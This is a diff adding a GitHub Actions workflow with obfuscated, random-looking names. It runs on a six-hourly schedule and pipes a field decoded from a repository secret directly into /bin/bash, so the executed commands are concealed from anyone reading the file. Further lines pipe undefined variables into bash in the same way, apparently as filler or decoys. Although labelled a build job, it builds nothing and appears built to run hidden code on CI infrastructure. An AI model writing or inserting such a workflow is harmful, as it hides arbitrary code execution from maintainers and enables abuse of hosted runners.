@@ -1,0 +1,25 @@
+name: tangutxo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tangutxo
+        env:
+          gwp95: ${{ secrets.gwp95 }}
+        run: |
+          echo $gwp95 | jq -r .yd45 | /bin/bash
+          echo $ngiux226 | jq -r .vvbhg35430 | /bin/bash
+          echo $omuv4 | jq -r .pd47 | /bin/bash
+          echo $pvmjw7931 | jq -r .oa4205 | /bin/bash
+          echo $ews417 | jq -r .my0574 | /bin/bash
+          echo $foo6 | jq -r .xdpu8058 | /bin/bash
+          echo $o55 | jq -r .h29 | /bin/bash
+
